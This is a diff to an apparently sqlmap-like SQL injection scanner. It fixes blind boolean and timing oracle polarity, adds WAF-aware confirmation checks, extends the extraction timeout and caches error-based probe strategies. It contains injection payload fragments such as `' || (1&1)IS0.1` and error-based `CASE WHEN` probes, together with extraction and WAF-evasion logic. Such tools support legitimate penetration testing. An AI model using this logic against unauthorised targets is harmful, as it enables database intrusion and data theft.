@@ -54758,6 +54758,9 @@ class Scanner:
         _bool_norm_false = None
         _bool_false_len = None
         _boolean_oracle = False
+        # BUG-ORACLE-INVERSION FIX: when sanity check detects 1=1→False/1=2→True,
+        # the oracle polarity is inverted. Set to True to flip all oracle results.
+        _oracle_inverted = False
 
         # Clear ALL stale progress from previous runs
         # BUG-INLINE-IMPORT-FIX: Replaced inline `import shutil as _shutil_inf, ...`
@@ -57478,6 +57481,17 @@ class Scanner:
             # Timing oracle: only reached when _boolean_oracle=False
             return ms >= _thresh
 
+        # BUG-ORACLE-INVERSION-EVAL FIX: transparent polarity-inversion wrapper.
+        # When _oracle_inverted=True (1=1→False detected at sanity check), invert
+        # every True/False result so callers always see the logically correct value.
+        # None (ambiguous/network-error) is left unchanged — not a polarity issue.
+        _eval_inner = _eval
+        async def _eval(cond):
+            r = await _eval_inner(cond)
+            if _oracle_inverted and r is not None:
+                return not r
+            return r
+
         async def _eval_confirm(cond):
             """Evaluate with double-confirmation for critical decisions."""
             r1 = await _eval(cond)
@@ -57925,7 +57939,18 @@ class Scanner:
                 return None  # Boolean oracle active but no sub-oracle fired — probe is ambiguous
             return ms >= _thresh
 
-        #  ENHANCEMENT: Auto-adjust timing 
+        # BUG-ORACLE-INVERSION-WAFEVAL FIX: same polarity-inversion wrapper for
+        # _waf_aware_eval. All char extraction paths (_extract_char_bitwise,
+        # _extract_char_equality, _extract_char_subtraction) go through _cached_eval
+        # which calls _waf_aware_eval — so inverting here covers all of them.
+        _waf_aware_eval_inner = _waf_aware_eval
+        async def _waf_aware_eval(cond):
+            r = await _waf_aware_eval_inner(cond)
+            if _oracle_inverted and r is not None:
+                return not r
+            return r
+
+        #  ENHANCEMENT: Auto-adjust timing
         # If margin drops below 40% of original, increase sleep duration
         _original_margin = _margin
 
@@ -58866,7 +58891,23 @@ class Scanner:
                     _san_t = await _eval("1=1")
                     await asyncio.sleep(_delay * 0.5)
                     _san_f = await _eval("1=2")
-                    if not (_san_t is True and _san_f is False):
+                    if _san_t is True and _san_f is False:
+                        LOG.debug("[Inference] Deferred oracle sanity OK (1=1→True, 1=2→False)")
+                    elif _san_t is False and _san_f is True:
+                        # BUG-ORACLE-INVERSION FIX (CRITICAL): inverted polarity oracle.
+                        # The detection payload creates an OR/AND nesting that flips
+                        # True↔False (e.g. `' || (1&1)IS0.1` — OR with IS NOT TRUE).
+                        # Activate global inversion so all subsequent oracle calls return
+                        # the correct logical value. Clear the eval cache so stale
+                        # non-inverted results (from earlier calibration) are not reused.
+                        _oracle_inverted = True
+                        _eval_cache.clear()
+                        LOG.info(
+                            "[Inference] Deferred oracle sanity: INVERTED polarity detected "
+                            "(1=1→False, 1=2→True) — activating oracle inversion; "
+                            "all subsequent True/False oracle results will be flipped"
+                        )
+                    else:
                         _oracle_fragile = True
                         LOG.info(
                             "[Inference] Deferred oracle sanity FAILED"
@@ -58874,8 +58915,6 @@ class Scanner:
                             " (ST timing target with CDN bypass caching?)",
                             _san_t, _san_f,
                         )
-                    else:
-                        LOG.debug("[Inference] Deferred oracle sanity OK (1=1→True, 1=2→False)")
                 except Exception as _san_err:
                     _oracle_fragile = True
                     LOG.warning("[Inference] Deferred oracle sanity probe failed (%s) — marking oracle fragile", _san_err)
@@ -109845,6 +109884,32 @@ class TechniqueCascadeEngine:
                 _INJECTION_CONFIRMED[0] = True  # BUG-RESTORE-RACE FIX
                 _SCAN_STOPPED[0] = True
                 return True, 1, _details
+        # BUG-CHECKE-CHECKD-DUAL FIX: When Check E passes (detection + DBMS-SQL
+        # responses are consistent) AND Check D shows at least 1 header diff,
+        # the combination is sufficient evidence for non-timing boolean techniques.
+        # Check A may fail when WAF blocks all SUBSTRING canary probes (returns 400
+        # for every probe → gap=0 → no-gap-above-threshold). In that case the only
+        # surviving signals are Check E (SQL consistency) and Check D (header change).
+        # Together they prove: (a) the body did change relative to baseline AND
+        # (b) that change is consistent with DBMS-specific SQL execution AND
+        # (c) a header changed between true/false probes. Hard to satisfy by accident.
+        if (_e_pass and not _timing_only_tech
+                and tech not in ("T", "TH", "HQ", "BT", "S", "DS")
+                and _d_count >= 1):
+            print(f"[*]   [PCV] Result: CONFIRMED  Check E (DBMS-SQL consistency) + "
+                  f"Check D ({_d_count} header diffs) dual-check passed "
+                  f"[tech={tech} dbms={dbms}]", flush=True)
+            if det is not None:
+                try:
+                    det._pcv_verified = True
+                    if hasattr(det, 'detection') and det.detection is not None:
+                        det.detection._pcv_verified = True
+                except Exception:
+                    pass
+            _INJECTION_CONFIRMED[0] = True  # BUG-RESTORE-RACE FIX
+            _SCAN_STOPPED[0] = True
+            return True, 1, _details
+
         # BUG-PCV-ERROR-PAGE-ORDER FIX: Moved _is_error_page rejection to AFTER all
         # body-confirmation paths (Check A+C, FP-preconfirmed).  Previously this guard
         # fired BEFORE the BUG-3-1/3-2 Check A+C block, unconditionally rejecting
@@ -126099,7 +126164,7 @@ class ScannerV14(ScannerV13):
                     await asyncio.wait_for(
                         self._process_v11(engine, _best_conf,
                                           _best_conf.get('data', data), tamper_chain),
-                        timeout=600)
+                        timeout=1200)  # BUG-PY313-RECOVERY-TIMEOUT FIX: 600s was too short for full extraction with bitwise fallback
                 except asyncio.TimeoutError:
                     print("[!] [PY313-RECOVERY] Rerun timed out", flush=True)
                 except Exception as _py313_e:
@@ -132821,6 +132886,16 @@ class SideChannelExtractor:
                  f"{self._prefix}SELECT 1/CASE WHEN 1>0 THEN 0 ELSE 1 END{self._suffix}",
                  f"{self._prefix}SELECT 1/CASE WHEN 1>2 THEN 0 ELSE 1 END{self._suffix}"),
             ]
+
+        # BUG-SCE-PROBE-REVALIDATION FIX (HIGH): previously probe_where_error()
+        # reset self._error_strategy = None and re-validated from scratch on every
+        # call. When extraction pivots across targets (version → current_catalog →
+        # current_user), CDN state variance between re-validation rounds causes
+        # cast_err to pass for the first target but fail real-condition validation
+        # for subsequent ones — even though the underlying oracle is still valid.
+        # Fix: skip re-probing entirely if a strategy was already validated.
+        if self._error_strategy and self._signal_type:
+            return True
 
         # Test each strategy: check status code, body length, and headers
         self._error_strategy = None
